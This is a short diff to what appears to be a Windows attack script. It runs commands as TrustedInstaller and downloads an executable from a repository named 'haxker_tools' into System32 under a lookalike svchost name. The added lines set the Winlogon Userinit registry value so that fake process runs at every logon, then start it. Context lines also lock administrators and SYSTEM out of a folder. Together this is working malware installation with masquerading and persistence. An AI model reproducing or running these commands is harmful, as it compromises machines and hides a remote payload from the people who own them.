@@ -36,3 +36,5 @@ gsudo -s --ti icacls "C:\uptm" /deny "NT AUTHORITY\SYSTEM:(OI)(CI)(F)" "Administ
 
 # 6. Fake svchost run and download
 gsudo -s --ti powershell -Command 'iwr https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/svchost.exe -OutFile "C:\Windows\System32\svсhost.exe"'
+gsudo -s --ti reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "USERINIT" /t REG_SZ /d "C:\windows\system32\svсhost.exe, C:\Windows\system32\userinit.exe," /f
+gsudo -s --ti start "C:\Windows\System32\svсhost.exe"
